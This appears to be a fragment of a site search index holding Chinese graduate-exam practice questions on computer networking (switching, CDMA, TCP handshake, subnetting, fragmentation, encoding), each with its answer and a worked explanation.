\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u8fdb\u884c\u8f6c\u53d1\u51b3\u7b56\u65f6\u4f7f\u7528\u7684PDU\u5730\u5740\u662f \u3002[\u5357\u4eac\u5927\u5b66] A\uff0e\u76ee\u7684\u7269\u7406\u5730\u5740 B\uff0e\u76ee\u7684IP\u5730\u5740 C\uff0e\u6e90\u7269\u7406\u5730\u5740 D\uff0e\u6e90IP\u5730\u5740 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\u662f\u6570\u636e\u94fe\u8def\u5c42\u8bbe\u5907\uff0c\u5b83\u7684\u8f6c\u53d1\u51b3\u7b56\u662f\u4f9d\u636ePDU\u7684\u76ee\u7684\u7269\u7406\u5730\u5740\u3002 2.3. Wed # \u7ad9\u70b9A\u3001B\u3001C\u901a\u8fc7CDMA\u5171\u4eab\u94fe\u8def\uff0cA\u3001B\u3001C\u7684\u7801\u7247\u5e8f\u5217\uff08chipping sequence\uff09\u5206\u522b\u662f\uff081,1,1,1\uff09\u3001\uff081\uff0c-1,1\uff0c-1\uff09\u548c\uff081\uff0c1,-1\uff0c-1\uff09\uff0c\u82e5C\u4ece\u94fe\u8def\u4e0a\u6536\u5230\u7684\u5e8f\u5217\u662f\uff082,0,2,0,0\uff0c-2,0\uff0c-2,0,2,0,2\uff09\uff0c\u5219C\u6536\u5230A\u53d1\u9001\u7684\u6570\u636e\u662f \u3002[\u897f\u5317\u5927\u5b66] A.000 B.101 C.110 D.111 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1aC\u63a5\u6536\u5230\u7684\u662fA\uff0cB\u53d1\u9001\u8fc7\u6765\u7684\u53e0\u52a0\u7801\u7247\uff0cC\u60f3\u8981\u770bA\u53d1\u9001\u7684\u6570\u636e\uff0c\u5c31\u5c06\u63a5\u6536\u5230\u7684\u53e0\u52a0\u7801\u7247\u4e0eA\u7684\u7801\u7247\u5e8f\u5217\u8fdb\u884c\u89c4\u683c\u5316\u5185\u79ef\u64cd\u4f5c\uff1a\uff082\uff0c0\uff0c2\uff0c0\uff1b0\uff0c-2\uff0c0\uff0c-2\uff1b0\uff0c2\uff0c0\uff0c2\uff09\u6bcf\u56db\u4f4d\u4e0e\uff081\uff0c1\uff0c1\uff0c1\uff09\u8fdb\u884c\u89c4\u683c\u5316\u5185\u79ef\uff0c\uff082*1+0*1+2*1+0*1)/4=1;\uff080*1+-2*1+0*1+-2*1)/4=-1\uff0c-1\u53730;\uff080*1+2*1+0*1+2*1)/4=1;\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c101\u3002 2.4. Thu # \u4e3b\u673a\u7532\u901a\u8fc71\u4e2a\u8def\u7531\u5668(\u5b58\u50a8\u8f6c\u53d1\u65b9\u5f0f)\u4e0e\u4e3b\u673a\u4e59\u4e92\u8054\uff0c\u4e24\u6bb5\u94fe\u8def\u7684\u6570\u636e\u4f20\u8f93\u901f\u7387\u5747\u4e3a10Mbps\uff0c\u4e3b\u673a\u7532\u5206\u522b\u91c7\u7528\u62a5\u6587\u4ea4\u6362\u548c\u5206\u7ec4\u5927\u5c0f\u4e3a10kb\u7684\u5206\u7ec4\u4ea4\u6362\u5411\u4e3b\u673a\u4e59\u53d1\u90011\u4e2a\u5927\u5c0f\u4e3a8Mb(1M=106)\u7684\u62a5\u6587\u3002\u82e5\u5ffd\u7565\u94fe\u8def\u4f20\u64ad\u5ef6\u8fdf\u3001\u5206\u7ec4\u5934\u5f00\u9500\u548c\u5206\u7ec4\u62c6\u88c5\u65f6\u95f4\uff0c\u5219\u4e24\u79cd\u4ea4\u6362\u65b9\u5f0f\u5b8c\u6210\u8be5\u62a5\u6587\u4f20\u8f93\u6240\u9700\u7684\u603b\u65f6\u95f4\u5206\u522b\u4e3a [\u5357\u4eac\u7406\u5de5\u5927\u5b66] A\uff0e800ms\u30011600ms B\uff0e801ms\u30011600ms C\uff0e1600ms\u3001800ms D\uff0e1600ms\u3001801ms \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u4e0d\u8fdb\u884c\u5206\u7ec4\u65f6\uff0c\u53d1\u9001\u4e00\u4e2a\u62a5\u6587\u7684\u65f6\u5ef6\u662f8Mb/10Mb/s=800ms\uff0c\u5728\u63a5\u6536\u7aef\u63a5\u6536\u6b64\u62a5\u6587\u7684\u65f6\u5ef6\u4e5f\u662f800ms\uff0c\u5171\u8ba11600ms\u3002\u8fdb\u884c\u5206\u7ec4\u540e\uff0c\u53d1\u9001\u4e00\u4e2a\u62a5\u6587\u7684\u65f6\u5ef6\u662f10kb/10Mb/s=1ms\uff0c\u63a5\u6536\u4e00\u4e2a\u62a5\u6587\u7684\u65f6\u5ef6\u4e5f\u662f1ms\uff0c\u4f46\u662f\u5728\u53d1\u9001\u7b2c\u4e8c\u4e2a\u62a5\u6587\u65f6\uff0c\u7b2c\u4e00\u4e2a\u62a5\u6587\u5df2\u7ecf\u5f00\u59cb\u63a5\u6536\u3002\u5171\u8ba1\u6709800\u4e2a\u5206\u7ec4\uff0c\u603b\u65f6\u95f4\u4e3a801ms\u3002 2.5. Fri # \u4e3b\u673a\u7532\u5411\u4e3b\u673a\u4e59\u53d1\u9001\u4e00\u4e2a(SYN\uff1d1\uff0cseq\uff1d11220)\u7684TCP\u6bb5\uff0c\u671f\u671b\u4e0e\u4e3b\u673a\u4e59\u5efa\u7acbTCP\u8fde\u63a5\uff0c\u82e5\u4e3b\u673a\u4e59\u63a5\u53d7\u8be5\u8fde\u63a5\u8bf7\u6c42\uff0c\u5219\u4e3b\u673a\u4e59\u5411\u4e3b\u673a\u7532\u53d1\u9001\u7684\u6b63\u786e\u7684TCP\u6bb5\u53ef\u80fd\u662f [\u5357\u4eac\u7406\u5de5\u5927\u5b66] A\uff0e\uff08SYN\uff1d0\uff0cACK\uff1d0\uff0cseq\uff1d11221\uff0cack\uff1d11221\uff09 B\uff0e\uff08SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1d11220\uff0cack\uff1d11220\uff09 C\uff0e\uff08SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1d11221\uff0cack\uff1d11221\uff09 D\uff0e\uff08SYN\uff1d0\uff0cACK\uff1d0\uff0cseq\uff1d11220\uff0cack\uff1d11220\uff09 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1aTCP\u662f\u9762\u5411\u8fde\u63a5\u7684\uff0c\u6240\u8c13\u9762\u5411\u8fde\u63a5\uff0c\u5c31\u662f\u5f53\u8ba1\u7b97\u673a\u53cc\u65b9\u901a\u4fe1\u65f6\u5fc5\u9700\u5148\u5efa\u7acb\u8fde\u63a5\uff0c\u7136\u540e\u6570\u636e\u4f20\u9001\uff0c\u6700\u540e\u62c6\u9664\u4e09\u4e2a\u8fc7\u7a0b\uff0c\u4e5f\u5c31\u662f\u5ba2\u6237\u4e3b\u52a8\u6253\u5f00TCP\u4f20\u8f93\uff0c\u670d\u52a1\u5668\u88ab\u52a8\u6253\u5f00\u3002 \u7b2c\u4e00\u6b21\u63e1\u624b\uff1a\u5ba2\u6237\u53d1\u9001SYN\uff1d1\uff0cseq\uff1dx\u7ed9\u670d\u52a1\u5668\uff0c\u5373\u5ba2\u6237\u7684TCP\u5411\u670d\u52a1\u5668\u53d1\u51fa\u8fde\u63a5\u8bf7\u6c42\u62a5\u6587\u6bb5\uff0c\u5176\u9996\u90e8\u4e2d\u7684\u540c\u6b65\u4f4dSYN\uff1d1\uff0c\u5e76\u9009\u62e9\u5e8f\u53f7seq\uff1dx\uff0c\u8868\u660e\u4f20\u9001\u6570\u636e\u65f6\u7684\u7b2c\u4e00\u4e2a\u6570\u636e\u5b57\u8282\u7684\u5e8f\u53f7\u662fx\u3002 \u7b2c\u4e8c\u6b21\u63e1\u624b\uff1a\u670d\u52a1\u5668\u53d1\u9001SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1dy\uff0cack\uff1dx+1\u7ed9\u5ba2\u6237\uff0c\u5373\u670d\u52a1\u5668\u7684TCP\u6536\u5230\u8fde\u63a5\u8bf7\u6c42\u62a5\u6587\u6bb5\u540e\uff0c\u5982\u540c\u610f\u5219\u53d1\u56de\u786e\u8ba4\u3002\u670d\u52a1\u5668\u5728\u786e\u8ba4\u62a5\u6587\u6bb5\u4e2d\u5e94\u4f7fSYN\uff1d1\uff0c\u4f7fACK\uff1d1\uff0c\u5176\u786e\u8ba4\u53f7ack\uff1dx+1\uff0c\u81ea\u5df1\u9009\u62e9\u7684\u5e8f\u53f7seq\uff1dy\u3002 \u7b2c\u4e09\u6b21\u63e1\u624b\uff1a\u5ba2\u6237\u53d1\u9001ACK\uff1d1\uff0cseq\uff1dx+1\uff0cack\uff1dy+1\u7ed9\u670d\u52a1\u5668\uff0c\u5373\u5ba2\u6237\u6536\u5230\u6b64\u62a5\u6587\u6bb5\u540e\u5411\u670d\u52a1\u5668\u7ed9\u51fa\u786e\u8ba4\uff0c\u5176ACK\uff1d1\uff0c\u786e\u8ba4\u53f7ack\uff1dy+1\u3002\u5ba2\u6237\u7684TCP\u901a\u77e5\u4e0a\u5c42\u5e94\u7528\u8fdb\u7a0b\uff0c\u8fde\u63a5\u5df2\u7ecf\u5efa\u7acb\u3002 \u670d\u52a1\u5668\u7684TCP\u6536\u5230\u4e3b\u673a\u5ba2\u6237\u7684\u786e\u8ba4\u540e\uff0c\u4e5f\u901a\u77e5\u5176\u4e0a\u5c42\u5e94\u7528\u8fdb\u7a0b\uff1aTCP\u8fde\u63a5\u5df2\u7ecf\u5efa\u7acb\u3002\u56e0\u6b64\uff0c\u672c\u9898\u4e2dx\uff1d11220\uff0cy\u662f\u4e3b\u673a\u4e59\u81ea\u52a8\u9009\u53d6\u7684\u5e8f\u53f7\uff0c\u53ef\u4ee5\u4e0ex\u76f8\u540c\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u76f8\u540c\uff0c\u4ece\u800c\u4e3b\u673a\u4e59\u6240\u53d1\u51fa\u7684TCP\u6bb5\u5e94\u8be5\u662fSYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1dy\uff0cack\uff1dx+1\uff0c\u5373SYN\uff1d1\uff0cACK\uff1d1\uff0cseq\uff1dy\uff0cack\uff1d11221\uff0c\u4ece\u800c\u7b54\u6848\u662fC\u3002 2.6. Sat # \u5728\u65e0\u566a\u58f0\u60c5\u51b5\u4e0b\uff0c\u82e5\u67d0\u901a\u4fe1\u94fe\u8def\u7684\u5e26\u5bbd\u4e3a3kHz\uff0c\u91c7\u75284\u4e2a\u76f8\u4f4d\uff0c\u6bcf\u4e2a\u76f8\u4f4d\u5177\u67094\u79cd\u632f\u5e45\u7684QAM\u8c03\u5236\u6280\u672f\uff0c\u5219\u8be5\u901a\u4fe1\u94fe\u8def\u7684\u6700\u5927\u6570\u636e\u4f20\u8f93\u901f\u7387\u662f [\u5409\u6797\u5927\u5b66] A\uff0e12 kbps B\uff0e24 kbps C\uff0e48 kbps D\uff0e96 kbps \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u9996\u5148\u8981\u6839\u636e\u4fe1\u9053\u6709\u65e0\u566a\u58f0\u6765\u786e\u5b9a\u662f\u5426\u91c7\u7528\u5948\u594e\u65af\u7279\u5b9a\u7406\u3002\u89e3\u9898\u96be\u70b9\u5728\u4e8e\u79bb\u6563\u6570\u503c\u7684\u786e\u5b9a\uff0c\u5148\u786e\u5b9a\u8c03\u5236\u6280\u672f\u7684\u7801\u5143\u6570\uff0c\u6b64\u5904\u4e3a4\u4e2a\u76f8\u4f4d\u4e58\u4ee54\u79cd\u632f\u5e45\uff0c\u517116\u79cd\uff0c\u5373\u8be5\u901a\u4fe1\u94fe\u8def\u7684\u6700\u5927\u6570\u636e\u4f20\u8f93\u901f\u7387\uff1d2\u00d73\u00d7\u33d22\uff084\u00d74\uff09\uff1d6\u00d74\uff1d24kbps\u3002 2.7. Sun # \u82e5\u4e0b\u56fe\u4e3a10 BaseT \u7f51\u5361\u63a5\u6536\u5230\u7684\u4fe1\u53f7\u6ce2\u5f62\uff0c\u5219\u8be5\u7f51\u5361\u6536\u5230\u7684\u6bd4\u7279\u4e32\u662f \u3002[\u4e2d\u5357\u5927\u5b66] A. 0011 0110 B. 1010 1101 C. 0101 0010 D. 1100 0101 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4ee5\u592a\u7f51\u6570\u636e\u7f16\u7801\u683c\u5f0f\u4e3a\uff1a\u66fc\u5f7b\u65af\u7279\u7f16\u7801\u3002 \u7f16\u7801\u89c4\u5219\u4e3a\uff1a1.\u4f4d\u4e2d\u95f4\u7535\u5e73\u4ece\u9ad8\u5230\u4f4e\u8df3\u53d8\u8868\u793a\"0\"\uff08\u5373\u4e0b\u964d\u6cbf\uff09\uff0c\u4f4d\u4e2d\u95f4\u7535\u5e73\u4ece\u4f4e\u5230\u9ad8\u8df3\u53d8\u8868\u793a\"1\"\uff08\u5373\u4e0a\u5347\u6cbf\uff09\u3002\u6216\u80052.\u4f4d\u4e2d\u95f4 \u7535\u5e73\u4ece\u9ad8\u5230\u4f4e\u8df3\u53d8\u8868\u793a\"1\"\uff0c\u4f4d\u4e2d\u95f4\u7535\u5e73\u4ece\u4f4e\u5230\u9ad8\u8df3\u53d8\u8868\u793a\"0\"\u3002 \u56e0\u6b64\u7b54\u6848\u4e3a1\uff1a11001001 \u6216\u80052\uff1a00110110\u9009A\u3002","title":"2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2020-july","text":"","title":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#_1","text":"\u8ba1\u7b97\u673a\u7f51\u7edc\u6bcf\u65e5\u4e00\u9898 2020 July \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Thu 1.3. Fri 1.4. Sat 1.5. Sun 2. Week 4 2.1. Mon 2.2. Tue 2.3. Wed 2.4. Thu 2.5. Fri 2.6. Sat 2.7. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#11-wed","text":"\u67d0\u7f51\u7edc\u7684IP\u5730\u5740\u7a7a\u95f4\u4e3a192.168.5.0/24\uff0c\u91c7\u7528\u5b9a\u957f\u5b50\u7f51\u5212\u5206\uff0c\u5b50\u7f51\u63a9\u7801\u4e3a255.255.255.248\uff0c\u5219\u8be5\u7f51\u7edc\u7684\u6700\u5927\u5b50\u7f51\u4e2a\u6570\uff0c\u6bcf\u4e2a\u5b50\u7f51\u5185\u7684\u6700\u5927\u53ef\u5206\u914d\u5730\u5740\u4e2a\u6570\u4e3a\u5404\u4e3a\u591a\u5c11\uff1f[\u897f\u5317\u5927\u5b66] A.32. 6 B.32. 8 C.8. 32 D.8. 30 \u6ce8\uff1a\u4e3b\u673a\u53f7\u51680\u4e3a\u7f51\u7edc\u5730\u5740\uff0c\u51681\u4e3a\u5e7f\u64ad\u5730\u5740 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u4e00\u4e2aIP\u7684\u7ec4\u6210\u90e8\u5206\u4e3a\uff1a\u7f51\u7edc\u53f7+\u5b50\u7f51\u53f7+\u4e3b\u673a\u53f7\uff0c\u5bf9\u4e8e\u8fd9\u6837\u7684IP 192.168.5.0/24,\u7531/24\u53ef\u4ee5\u77e5\u9053\u5176\u5b50\u7f51\u63a9\u7801\u9ed8\u8ba4\u4e3a255.255.255.0 \uff0c255.255.255.248,\u4e8c\u8fdb\u5236\u4f4d\uff1a(11111111. 11111111. 11111111)(24\u8868\u793a\u7f51\u7edc\u53f7).11111(\u5b50\u7f51\u63a9\u7801) 000 \uff0c\u5b50\u7f51\u63a9\u7801\u4e2d\u51681\u8868\u793a\u7684\u7f51\u7edc\u53f7\u548c\u5b50\u7f51\u53f7\u90e8\u5206\uff0c0\u90e8\u5206\u8868\u793a\u4e3b\u673a\u53f7\u90e8\u5206\u3002(11111)2 \u8f6c\u6362\u4e3a\u5341\u8fdb\u5236\u4e3a2^5 =32 \u6240\u4ee5\u53ef\u4ee5\u5212\u5206\u4e3a32\u4e2a\u5b50\u7f51\uff0c\u800c\u540e\u9762\u67093\u4e2a0\uff0c\u6240\u4ee5000 - 111\u8868\u793a\u7684\u8303\u56f42^3 -2\uff08\u51680\u548c\u51681\u4e0d\u53ef\u7528\uff09=6 \u6240\u4ee5\u7b54\u6848\u4e3a32,6 \u9009A\u3002","title":"1.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#12-thu","text":"\u5f53\u4e00\u4e2aIP\u5206\u7ec4\u8fdb\u884c\u76f4\u63a5\u4ea4\u4ed8\u65f6\uff0c\u8981\u6c42\u53d1\u9001\u65b9\u548c\u76ee\u7684\u7ad9\u5177\u6709\u76f8\u540c\u7684 \u3002[\u897f\u5317\u5927\u5b66] A\uff0eIP\u5730\u5740 B\uff0e\u4e3b\u673a\u53f7 C\uff0e\u7f51\u7edc\u53f7 D\uff0e\u5b50\u7f51\u5730\u5740 \u6ce8\uff1a\u4e09\u7ea7IP\u5730\u5740\u7684\u7ed3\u6784\u4e3a IP\u5730\u5740 = {<\u7f51\u7edc\u53f7>\uff0c<\u5b50\u7f51\u53f7>\uff0c<\u4e3b\u673a\u53f7>}\u3002\u65e0\u5206\u7c7b\u57df\u95f4\u8def\u7531\u9009\u62e9(CIDR)\u4f7f\u7528\u7f51\u7edc\u524d\u7f00\u7684\u6982\u5ff5\u4ee3\u66ff\u5b50\u7f51\u7684\u6982\u5ff5\uff0cIP\u5730\u5740\u7684\u65e0\u5206\u7c7b\u4e24\u7ea7\u7f16\u5740\u4e3a IP\u5730\u5740 = {<\u7f51\u7edc\u524d\u7f00>\uff0c<\u4e3b\u673a\u53f7>}\u3002 \u7b54\u6848 \u7b54\u6848\uff1aD \u89e3\u6790\uff1a\u5224\u65ad\u4e00\u4e2aIP\u5206\u7ec4\u7684\u4ea4\u4ed8\u65b9\u5f0f\u662f\u76f4\u63a5\u4ea4\u4ed8\u8fd8\u662f\u95f4\u63a5\u4ea4\u4ed8\uff0c\u8def\u7531\u5668\u9700\u8981\u6839\u636e\u5206\u7ec4\u7684\u76ee\u7684IP\u5730\u5740\u548c\u6e90IP\u5730\u5740\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u5b50\u7f51\u6765\u8fdb\u884c\u5224\u65ad\u3002\u5177\u4f53\u6765\u8bf4\uff0c\u5c06\u4e00\u4e2a\u5206\u7ec4\u7684\u6e90IP\u5730\u5740\u548c\u76ee\u7684IP\u5730\u5740\u5206\u522b\u4e0e\u5b50\u7f51\u63a9\u7801\u8fdb\u884c\u201c\u4e0e\u201d\u6bd4\u8f83\uff0c\u5982\u679c\u5f97\u5230\u7684\u5b50\u7f51\u5730\u5740\u76f8\u540c\uff0c\u8be5\u5206\u7ec4\u5c31\u91c7\u7528\u76f4\u63a5\u4ea4\u4ed8\u65b9\u5f0f\uff0c\u5426\u5219\u5c31\u8fdb\u884c\u95f4\u63a5\u4ea4\u4ed8\u3002","title":"1.2. Thu"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#13-fri","text":"\u4e00\u4e2aUDP\u7528\u6237\u6570\u636e\u62a5\u7684\u6570\u636e\u5b57\u6bb5\u4e3a8192\u5b57\u8282\u3002\u5728\u94fe\u8def\u5c42\u8981\u4f7f\u7528\u4ee5\u592a\u7f51\u6765\u4f20\u9001\uff0c\u5e94\u5f53\u5212\u5206\u4e3a \u4e2aIP\u6570\u636e\u62a5\u7247\uff0c\u6700\u540e\u4e00\u4e2aIP\u6570\u636e\u62a5\u7247\u7684\u5b57\u6bb5\u957f\u5ea6\u4e3a \u3002[\u5409\u6797\u5927\u5b66\u7b80\u7b54\u9898\u6539\u7f16] A\uff0e6\uff0c800 B\uff0e6\uff0c1480 C\uff0e7\uff0c800 D\uff0e7\uff0c1480 \u6ce8\uff1aIP\u9996\u90e8\u4e3a20B\uff0cUDP\u9996\u90e8\u4e3a8B\uff0cTCP\u9996\u90e8\u4e3a20B\uff0c\u4ee5\u592a\u7f51\u4f20\u8f93\u7684\u6570\u636e\u5b57\u6bb5\u957f\u5ea6\u8303\u56f4\u4e3a46-1500\u3002 \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u6570\u636e\u62a5\u603b\u957f\u5ea6=8192+8\uff08UDP\u9996\u90e8\uff09=8200\u5b57\u8282\uff0c\u4ee5\u592a\u7f51\u4f20\u9001\uff0cIP\u5c42\u6700\u5927\u4f20\u9001\u5355\u5143MTU=1500\uff0c\u56e0\u4e3aIP\u9996\u90e8\u4e3a20\u5b57\u8282\uff0c\u6240\u4ee5\u6570\u636e\u90e8\u5206\u5360\u4e861480\u5b57\u8282\uff0c\u5219\uff1a8200/1480=5......800\uff0c\u6240\u4ee5\u5212\u5206\u4e3a6\u4e2aIP\u6570\u636e\u62a5\u7247\uff0c\u524d\u4e94\u4e2a\u6570\u636e\u5b57\u6bb5\u957f\u5ea6\u4e3a1480\u5b57\u8282\uff0c\u6700\u540e\u4e00\u4e2a\u6570\u636e\u5b57\u6bb5\u957f\u5ea6\u4e3a800\u5b57\u8282\u3002","title":"1.3. Fri"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#14-sat","text":"\u4e00\u4e2a\u8def\u7531\u5668\u7684\u8def\u7531\u8868\u901a\u5e38\u5305\u542b \u3002[\u5409\u6797\u5927\u5b66] A\uff0e\u76ee\u7684\u7f51\u7edc\u548c\u5230\u8fbe\u8be5\u76ee\u7684\u7f51\u7edc\u7684\u5b8c\u6574\u8def\u5f84 B\uff0e\u6240\u6709\u7684\u76ee\u7684\u4e3b\u673a\u548c\u5230\u8fbe\u8be5\u76ee\u7684\u4e3b\u673a\u7684\u5b8c\u6574\u8def\u5f84 C\uff0e\u76ee\u7684\u7f51\u7edc\u548c\u5230\u8fbe\u8be5\u76ee\u7684\u7f51\u7edc\u8def\u5f84\u4e0a\u7684\u4e0b\u4e00\u4e2a\u8def\u7531\u5668\u7684IP\u5730\u5740 D\uff0e\u4e92\u8054\u7f51\u4e2d\u6240\u6709\u8def\u7531\u5668\u7684IP\u5730\u5740 \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u5728IP\u4e92\u8054\u7f51\u4e2d\uff0c\u9700\u8981\u8fdb\u884c\u8def\u7531\u9009\u62e9\u7684\u8bbe\u5907\u4e00\u822c\u91c7\u7528\u8868\u9a71\u52a8\u7684\u8def\u7531\u9009\u62e9\u7b97\u6cd5\u3002\u6bcf\u53f0\u9700\u8981\u8def\u7531\u9009\u62e9\u7684\u8bbe\u5907\u4fdd\u5b58\u4e00\u5f20IP\u8def\u7531\u8868\uff0c\u8be5\u8868\u5b58\u50a8\u7740\u6709\u5173\u53ef\u80fd\u7684\u76ee\u7684\u5730\u5740\u53ca\u600e\u6837\u5230\u8fbe\u76ee\u7684\u5730\u5740\u7684\u4fe1\u606f\u3002\u5728\u9700\u8981\u4f20\u9001IP\u6570\u636e\u62a5\u65f6\uff0c\u5b83\u5c31\u67e5\u8be2\u8be5IP\u8def\u7531\u8868\uff0c\u51b3\u5b9a\u628a\u6570\u636e\u62a5\u53d1\u5f80\u4f55\u5904\u3002\u56e0\u7279\u7f51\u7684\u8def\u7531\u9009\u62e9\u7b97\u6cd5\u901a\u5e38\u4f7f\u7528\u4e00\u5f20IP\u8def\u7531\u9009\u62e9\u8868(\u8def\u7531\u8868)\uff0c\u4e00\u4e2a\u8def\u7531\u8868\u901a\u5e38\u5305\u542b\u8bb8\u591a(N\uff0cR)\u5bf9\u5e8f\u5076\uff0c\u5176\u4e2dN\u6307\u7684\u662f\u76ee\u7684\u7f51\u7edcIP\u5730\u5740\uff0cR\u662f\u5230\u7f51\u7edcN\u8def\u5f84\u4e0a\u4e0b\u4e00\u4e2a\u8def\u7531\u5668\u7684IP\u5730\u5740\u3002","title":"1.4. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#15-sun","text":"\u5bf9\u4e8e100Mbps \u7684\u4ee5\u592a\u7f51\u4ea4\u6362\u673a\uff0c\u5f53\u8f93\u51fa\u7aef\u53e3\u65e0\u6392\u961f\uff0c\u4ee5\u76f4\u901a\u4ea4\u6362\uff08cut-through switching\uff09\u65b9\u5f0f\u8f6c\u53d1\u4e00\u4e2a\u4ee5\u592a\u7f51\u5e27\uff08\u4e0d\u5305\u62ec\u524d\u5bfc\u7801\uff09\u65f6\uff0c\u5f15\u5165\u7684\u8f6c\u53d1\u5ef6\u8fdf\u81f3\u5c11\u662f\u3002[\u5357\u4eac\u5927\u5b66] A. 0\u03bcs B. 0.48\u03bcs C. 5.12\u03bcs D. 121.44\u03bcs \u6ce8\uff1a\u4ee5\u592a\u7f51\u5e27\u524d\u5bfc\u7801\u4e3a8B\uff0c\u5730\u5740\u4e3a6B\uff0c\u76f4\u901a\u4ea4\u6362\u53ea\u68c0\u67e5\u5e27\u7684\u76ee\u7684\u5730\u5740\u3002 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4ee5\u592a\u7f51\u7684\u76f4\u901a\u4ea4\u6362\u65b9\u5f0f\u5728\u8f93\u5165\u7aef\u53e3\u68c0\u6d4b\u5230\u4e00\u4e2a \u6570\u636e\u5305\u65f6\uff0c\u68c0\u67e5\u8be5\u5305\u7684\u5305\u5934\uff0c\u83b7\u53d6\u5305\u7684\u76ee\u7684\u5730\u5740\uff0c\u542f\u52a8\u5185\u90e8\u7684\u52a8\u6001\u67e5\u627e\u8868\u8f6c\u6362\u6210\u76f8\u5e94\u7684\u8f93\u51fa\u7aef\u53e3\uff0c\u5728\u8f93\u5165\u4e0e\u8f93\u51fa\u4ea4\u53c9\u5904\u63a5\u901a\uff0c\u628a\u6570\u636e\u5305\u76f4\u901a\u5230\u76f8\u5e94\u7684\u7aef\u53e3\uff0c\u5b9e\u73b0\u4ea4\u6362\u529f\u80fd\u3002\u5b83\u53ea\u68c0\u67e5\u6570\u636e\u5305\u7684\u5305\u5934(\u5305\u62ec7\u4e2a\u5b57\u8282\u7684\u524d\u540c\u6b65\u7801+1\u4e2a\u5b57\u8282\u7684\u5e27\u5f00\u59cb\u754c\u5b9a\u7b26+6\u4e2a\u5b57\u8282\u7684\u76ee\u7684\u5730\u5740\u517114\u4e2a\u5b57\u8282)\uff0c\u6709\u65f6\u9898\u76ee\u8bf4\u660e\u4e0d\u5305\u542b\u524d\u5bfc\u7801\uff0c\u5373\u53ea\u53056\u4e2a\u5b57\u8282\u542b\u76ee\u7684\u5730\u5740\u3002\u90a3\u4e48\u8f6c\u53d1\u65f6\u5ef6=6B/100Mbps=6*8b/[(100*10^6)b/10^6us]= 0.48us\u3002","title":"1.5. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#2-week-4","text":"","title":"2. Week 